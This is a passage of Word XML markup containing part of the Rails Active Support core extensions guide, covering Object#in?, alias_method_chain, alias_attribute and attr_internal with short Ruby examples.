            </w:r>
          </w:p>
          <w:p w14:paraId="733D8046" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>25.in?(30..50)      # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="196EEB94" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1.in?(1)            # =&gt; ArgumentError</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="54D45B29" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/object/inclusion.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BA12AD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Module</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A6B6E70" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>alias_method_chain</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56786E44" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Using plain Ruby you can wrap methods with other methods, that’s called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>alias chaining</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="652B0DA7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For example, let’s say you’d like params to be strings in functional tests, as they are in real requests, but still want the convenience of assigning integers and other kind of values. To accomplish that you could wrap </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionController::TestCase#process</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> this way in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>test/test_helper.rb</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263BE19D" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3FB7AF89" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActionController::TestCase.class_eval do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04D5FBE1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # save a reference to the original process method</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="202CA9CD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  alias_method :original_process, :process</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C7AE6C0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41F34651" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # now redefine process and delegate to original_process</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CDD60ED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>process(action, params=nil, session=nil, flash=nil, http_method='GET')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43DC3339" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    params = Hash[*params.map {|k, v| [k, v.to_s]}.flatten]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71A5E45A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    original_process(action, params, session, flash, http_method)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="043637F3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F0D2471" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="624B005A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">That’s the method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>post</w:t>
      </w:r>
      <w:r>
        <w:t>, etc., delegate the work to.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72595F00" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">That technique has a risk, it could be the case that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:original_process</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> was taken. To try to avoid collisions people choose some label that characterizes what the chaining is about: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EA3621A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="699E68D3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActionController::TestCase.class_eval do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D286128" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>process_with_stringified_params(...)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11243B10" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    params = Hash[*params.map {|k, v| [k, v.to_s]}.flatten]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35FA8E49" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    process_without_stringified_params(action, params, session, flash, http_method)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68314635" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="455F483A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  alias_method :process_without_stringified_params, :process</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7362C544" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  alias_method :process, :process_with_stringified_params</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F36A6A2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3CF763B3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>alias_method_chain</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> provides a shortcut for that pattern:</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4C1494F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="79B8A536" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActionController::TestCase.class_eval do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BA70AFE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>process_with_stringified_params(...)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="125D8E37" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    params = Hash[*params.map {|k, v| [k, v.to_s]}.flatten]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A258296" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    process_without_stringified_params(action, params, session, flash, http_method)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C0F8D94" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7BB765D7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  alias_method_chain :process, :stringified_params</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45CAEBB5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="56262B46" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails uses </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>alias_method_chain</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> all over the code base. For example validations are added to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Base#save</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> by wrapping the method that way in a separate module specialized in validations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1156F287" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/module/aliasing.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA2CD34" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 Attributes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33A72B84" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.2.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>alias_attribute</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F3D48D0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Model attributes have a reader, a writer, and a predicate. You can alias a model attribute having the corresponding three methods defined for you in one shot. As in other aliasing methods, the new name is the first argument, and the old name is the second (my mnemonic is they go in the same order as if you did an assignment):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6000"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6C969C98" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D1F0F94" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BA58D91" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # let me refer to the email column as "login",</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69349D42" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # possibly meaningful for authentication code</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2281E5EA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  alias_attribute :login, :email</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C5DFBED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="690269D4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/module/aliasing.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA2D88A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>3.2.2 Internal Attributes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E59D68A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>When you are defining an attribute in a class that is meant to be subclassed, name collisions are a risk. That’s remarkably important for libraries.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47882CA5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support defines the macros </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_internal_reader</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_internal_writer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_internal_accessor</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. They behave like their Ruby built-in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_*</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> counterparts, except they name the underlying instance variable in a way that makes collisions less likely.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E259ED7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The macro </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_internal</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is a synonym for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_internal_accessor</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5208"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2F96FE1B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="144B8356" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># library</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FFA3CEE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ThirdPartyLibrary::Crawler</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E004344" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  attr_internal :log_level</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B214225" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25F3795B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="088371D4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># client code</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35B2765B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>MyCrawler &lt; ThirdPartyLibrary::Crawler</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A735E92" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  attr_accessor :log_level</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56FFD4E3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4E9F0C07" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the previous example it could be the case that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:log_level</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> does not belong to the public interface of the library and it is only used for development. The client code, unaware of the potential conflict, subclasses and defines its own </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:log_level</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Thanks to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_internal</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> there’s no collision.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469D478D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By default the internal instance variable is named with a leading underscore, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@_log_level</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the example above. That’s configurable via </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Module.attr_internal_naming_format</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> though, you can pass any </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
